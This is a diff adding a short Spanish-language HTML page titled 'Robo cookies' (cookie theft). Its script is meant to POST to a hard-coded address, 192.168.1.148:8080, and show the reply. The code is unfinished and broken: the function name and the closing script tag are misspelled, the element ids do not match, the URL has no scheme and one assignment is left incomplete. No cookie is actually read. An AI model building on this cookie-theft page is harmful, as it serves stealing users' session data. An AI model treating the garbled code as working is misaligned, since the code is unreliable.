@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+
+    <meta charset="UTF-8">
+    <title>Robo cookies</title>
+</head>
+
+<body>
+    <h1>Enviar cookie</h1>
+    <h2 id="cookie data"></h2>
+    <button onclick="fecthData()">Fecth</button>"
+
+    <script>
+      
+
+        function fecthData() {
+           // document.getElementById("cookie").innerHTML = "";
+           cooke_header= document.getElementById("cookie_data");
+
+           fetch("192.168.1.148:8080", {method : 'POST'})
+           .then(response => response.json())
+           .then(function(json_data) {
+                cooke_header.innerHtml = 
+
+            )
+        }
+        </scrtipt>
+
+
+    
+</body>
+
+</html>
